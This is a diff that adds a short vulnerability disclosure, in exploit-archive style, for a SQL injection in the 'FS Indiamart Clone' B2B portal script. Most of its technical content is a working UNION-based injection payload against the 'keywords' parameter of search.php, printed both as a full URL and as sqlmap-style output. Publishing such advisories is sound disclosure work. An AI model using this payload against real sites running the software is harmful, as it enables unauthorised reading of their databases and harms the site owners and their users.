@@ -1,0 +1,36 @@
+# Exploit Title: FS Indiamart Clone - SQL Injection
+# Date: 2017-10-23
+# Exploit Author: 8bitsec
+# Vendor Homepage: https://fortunescripts.com/
+# Software Link: https://fortunescripts.com/product/indiamart-clone/
+# Version: 23 October 17
+# Tested on: [Kali Linux 2.0 | Mac OS 10.12.6]
+# Email: contact@8bitsec.io
+# Contact: https://twitter.com/_8bitsec
+
+Release Date:
+=============
+2017-10-23
+
+Product & Service Introduction:
+===============================
+The most favored web solution for webmasters aspiring to launch B2B Portals at minimum investment of time, money and effort.
+
+Technical Details & Description:
+================================
+
+SQL injection on [keywords] parameter.
+
+Proof of Concept (PoC):
+=======================
+
+SQLi:
+
+https://localhost/[path]/search.php?keywords=product') UNION ALL SELECT NULL,CONCAT(0x716b787071,0x506961776c6f79515068694b454e736668707675627448527949566e434472706a72624a466a5468,0x7171627171)-- LEhA&rctyp=Products
+
+Parameter: keywords (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: keywords=product') UNION ALL SELECT NULL,CONCAT(0x716b787071,0x506961776c6f79515068694b454e736668707675627448527949566e434472706a72624a466a5468,0x7171627171)-- LEhA&rctyp=Products
+==================
+8bitsec - [https://twitter.com/_8bitsec]
